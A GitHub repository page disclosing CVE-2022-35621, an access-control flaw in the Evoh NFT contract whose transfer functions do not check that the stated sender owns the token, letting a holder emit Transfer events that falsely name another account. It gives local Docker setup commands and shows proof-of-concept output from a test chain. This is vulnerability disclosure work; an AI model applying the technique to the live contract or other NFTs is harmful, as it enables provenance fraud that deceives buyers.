=== Content from github.com_ff80e1e8_20250115_095947.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FMacherCS%2FCVE_Evoh_Contract)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FMacherCS%2FCVE_Evoh_Contract)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=MacherCS%2FCVE_Evoh_Contract)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

This repository has been archived by the owner on Sep 22, 2022. It is now read-only.

[MacherCS](/MacherCS)
/
**[CVE\_Evoh\_Contract](/MacherCS/CVE_Evoh_Contract)**
Public archive

* [Notifications](/login?return_to=%2FMacherCS%2FCVE_Evoh_Contract) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2FMacherCS%2FCVE_Evoh_Contract)
* [Star
   0](/login?return_to=%2FMacherCS%2FCVE_Evoh_Contract)

These are the materials about the vulnerability of Evoh NFT contract

[0
stars](/MacherCS/CVE_Evoh_Contract/stargazers) [0
forks](/MacherCS/CVE_Evoh_Contract/forks) [Branches](/MacherCS/CVE_Evoh_Contract/branches) [Tags](/MacherCS/CVE_Evoh_Contract/tags) [Activity](/MacherCS/CVE_Evoh_Contract/activity)
 [Star](/login?return_to=%2FMacherCS%2FCVE_Evoh_Contract)

 [Notifications](/login?return_to=%2FMacherCS%2FCVE_Evoh_Contract) You must be signed in to change notification settings

* [Code](/MacherCS/CVE_Evoh_Contract)
* [Issues
  0](/MacherCS/CVE_Evoh_Contract/issues)
* [Pull requests
  0](/MacherCS/CVE_Evoh_Contract/pulls)
* [Actions](/MacherCS/CVE_Evoh_Contract/actions)
* [Projects
  0](/MacherCS/CVE_Evoh_Contract/projects)
* [Security](/MacherCS/CVE_Evoh_Contract/security)
* [Insights](/MacherCS/CVE_Evoh_Contract/pulse)

Additional navigation options

* [Code](/MacherCS/CVE_Evoh_Contract)
* [Issues](/MacherCS/CVE_Evoh_Contract/issues)
* [Pull requests](/MacherCS/CVE_Evoh_Contract/pulls)
* [Actions](/MacherCS/CVE_Evoh_Contract/actions)
* [Projects](/MacherCS/CVE_Evoh_Contract/projects)
* [Security](/MacherCS/CVE_Evoh_Contract/security)
* [Insights](/MacherCS/CVE_Evoh_Contract/pulse)

# MacherCS/CVE\_Evoh\_Contract

    main[Branches](/MacherCS/CVE_Evoh_Contract/branches)[Tags](/MacherCS/CVE_Evoh_Contract/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[6 Commits](/MacherCS/CVE_Evoh_Contract/commits/main/) | | |
| [evoh-erc721-master](/MacherCS/CVE_Evoh_Contract/tree/main/evoh-erc721-master "evoh-erc721-master") | | [evoh-erc721-master](/MacherCS/CVE_Evoh_Contract/tree/main/evoh-erc721-master "evoh-erc721-master") |  |  |
| [Dockerfile](/MacherCS/CVE_Evoh_Contract/blob/main/Dockerfile "Dockerfile") | | [Dockerfile](/MacherCS/CVE_Evoh_Contract/blob/main/Dockerfile "Dockerfile") |  |  |
| [README.md](/MacherCS/CVE_Evoh_Contract/blob/main/README.md "README.md") | | [README.md](/MacherCS/CVE_Evoh_Contract/blob/main/README.md "README.md") |  |  |
| [abi.json](/MacherCS/CVE_Evoh_Contract/blob/main/abi.json "abi.json") | | [abi.json](/MacherCS/CVE_Evoh_Contract/blob/main/abi.json "abi.json") |  |  |
| [createContract.dat](/MacherCS/CVE_Evoh_Contract/blob/main/createContract.dat "createContract.dat") | | [createContract.dat](/MacherCS/CVE_Evoh_Contract/blob/main/createContract.dat "createContract.dat") |  |  |
| [package.json](/MacherCS/CVE_Evoh_Contract/blob/main/package.json "package.json") | | [package.json](/MacherCS/CVE_Evoh_Contract/blob/main/package.json "package.json") |  |  |
| [poc.js](/MacherCS/CVE_Evoh_Contract/blob/main/poc.js "poc.js") | | [poc.js](/MacherCS/CVE_Evoh_Contract/blob/main/poc.js "poc.js") |  |  |
| [start.sh](/MacherCS/CVE_Evoh_Contract/blob/main/start.sh "start.sh") | | [start.sh](/MacherCS/CVE_Evoh_Contract/blob/main/start.sh "start.sh") |  |  |
| View all files | | |

## Repository files navigation

* README
# CVE\_Evoh\_Contract

These are the materials about the vulnerability of Evoh NFT contract

# CVE-ID

CVE-2022-35621

# PRODUCT

`EvohClaimable` is a public smart contract running in the [Ethereum blockchain](https://ethereum.org/en/). The source code of this contract is published in <https://github.com/evoh-nft/evoh-erc721> by its developer. The information of the deployed contract is in <https://etherscan.io/address/0xf883ab97ed3d5a9af062a65b6d4437ea015efd8a>.

This contract is responsible for managing the expensive NFTs (Evoh Llama Frens), such as minting them, transfering them, etc.. These NFTs are sold on the famous NFT market Opensea [here](https://opensea.io/collection/evoh-llama-frens), and the total volume has been 39 ETH ($47435.50 USD) at the time when I write this document. This NFT project is still active now.

# Version

This vulnerability is related to the latest version of this smart contract. The sha256 hash code of the smart contract is fa2084d5abca91a62ed1d2f1cad3ec318e6a9a2d7f1510a00d898737b05f48ae. Check it in the information of the deployed contract in <https://etherscan.io/address/0xf883ab97ed3d5a9af062a65b6d4437ea015efd8a>.

# PROBLEM TYPE

Access control vulnerability

# DESCRIPTION

Since in [ERC-721](https://eips.ethereum.org/EIPS/eip-721) based NFT contract, when the contract executes the functions responsible for transferring NFT, such as
**transferFrom(address \_from, address \_to, uint256 \_tokenId)** or
**safeTransferFrom(address \_from, address \_to, uint256 \_tokenId)**,
the contract will transfer the NFT whose ID is **\_tokenId** from account **\_from** to account **\_to**.
In addition, these functions should emit the specific event
**Transfer(address \_from, address \_to, uint256 \_tokenId)**
to blockchain system, which enables the off-chain applications (such as NFT market, DApp) to perceive the transfer behaviour of NFT and synchronize it from blockchain. For example, the emitted event will be displayed in the market to inform user "the NFT whose ID is **\_tokenId** is transfered from **\_from** to **\_to**".
For example, in the [page](https://opensea.io/assets/ethereum/0xf883ab97ed3d5a9af062a65b6d4437ea015efd8a/97), we can find the event displayed in the Item Activity tab.

This contract does not verify the parameter '\_from' of transferFrom and safeTransferFrom functions need to be the owner of NFT '\_tokenId'. This is a defect about access control: if the attacker Bob has the NFT '\_tokenId', he can transfer '\_tokenId' to Mike but he sets the the parameter '\_from' of transferFrom function to be Alice. Then transferFrom function will transfer the '\_tokenId' from Bob to Mike, but the emitted event will announce Alice transfers the NFT '\_tokenId' to Mike. That is, Bob is able to control the seller of NFT with any values, which can fake NFT transfer. Further, even if Bob is not the owner of NFT '\_tokenId', he can launch this attack if he is approved to sell the NFT. Therefore, this defect can lead to the [sleep mint attack](https://kf106.medium.com/how-to-sleepmint-nft-tokens-bc347dc148f2).

I also provide a PoC to reproduce this attack by deploying the same contract on the [ganache](https://trufflesuite.com/ganache/). The steps to execute the PoC are as follow:

1. activate the environment

```
$ git clone https://github.com/MacherCS/CVE_Evoh_Contract.git
$ cd CVE_Evoh_Contract
$ sudo docker build -t machercs/ganache:v1 .
$ sudo docker run --network host -it machercs/ganache:v1
```

2. exploit the vulnerability and emit wrong event to announce fake transfer.

```
[+] The address of Bob is: 0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1
[+] The address of Alice is: 0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0
[+] The address of Mike is: 0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b
...
[+] Bob mints NFT whose ID is 0
...
[+] The owner of NFT 0 is: 0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1
...
[+] Exploit end. The NFT 0 is transferred by Bob to Mike.
[+] The owner of NFT 0 is: 0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b
[+] The Transfer events in blockchain:
...
{
  logIndex: 0,
  transactionIndex: 0,
  transactionHash: '0x5f29ad15f94935e6246d70fbff2fba919793a9163427e631620ea8ff8a48bcf3',
  blockHash: '0xa736e1b756066edf8186d497a21045a5a055c336055c4462de70a734863cf8a4',
  blockNumber: 6,
  address: '0xe78A0F7E598Cc8b0Bb87894B0F60dD2a88d6a8Ab',
  type: 'mined',
  removed: false,
  id: 'log_8740b08f',
  returnValues: Result {
    '0': '0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0',
    '1': '0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b',
    '2': '0',
    _from: '0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0',
    _to: '0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b',
    _tokenId: '0'
  },
  event: 'Transfer',
  signature: '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef',
  raw: {
    data: '0x',
    topics: [
      '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef',
      '0x000000000000000000000000ffcf8fdee72ac11b5c542428b35eef5769c409f0',
      '0x00000000000000000000000022d491bde2303f2f43325b2108d26f1eaba1e32b',
      '0x0000000000000000000000000000000000000000000000000000000000000000'
    ]
  }
}
[+] Transfer(from:0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0, to:0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b, tokenId:0)
[+] The last event records the NFT 0 is transferred from Alice to Mike (instead of from Bob to Mike).
```

# Additional explanation

For the detail explanation of the exploit, please refer to the annotation of *poc.js* file.
The content of *evoh-erc721-master* folder is the source code of `EvohClaimable` contract.
The *CVE\_Evoh\_Contract/evoh-erc721-master/contracts/Claimable.sol* is the code of deployed contract.

## About

These are the materials about the vulnerability of Evoh NFT contract

### Resources

[Readme](#readme-ov-file)

[Activity](/MacherCS/CVE_Evoh_Contract/activity)
### Stars

[**0**
stars](/MacherCS/CVE_Evoh_Contract/stargazers)
### Watchers

[**1**
watching](/MacherCS/CVE_Evoh_Contract/watchers)
### Forks

[**0**
forks](/MacherCS/CVE_Evoh_Contract/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FMacherCS%2FCVE_Evoh_Contract&report=MacherCS+%28user%29)

## [Releases](/MacherCS/CVE_Evoh_Contract/releases)

No releases published

## [Packages 0](/users/MacherCS/packages?repo_name=CVE_Evoh_Contract)

No packages published

## [Contributors 2](/MacherCS/CVE_Evoh_Contract/graphs/contributors)

## Languages

* [Solidity
  42.0%](/MacherCS/CVE_Evoh_Contract/search?l=solidity)
* [Python
  38.1%](/MacherCS/CVE_Evoh_Contract/search?l=python)
* [JavaScript
  18.6%](/MacherCS/CVE_Evoh_Contract/search?l=javascript)
* Other
  1.3%

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


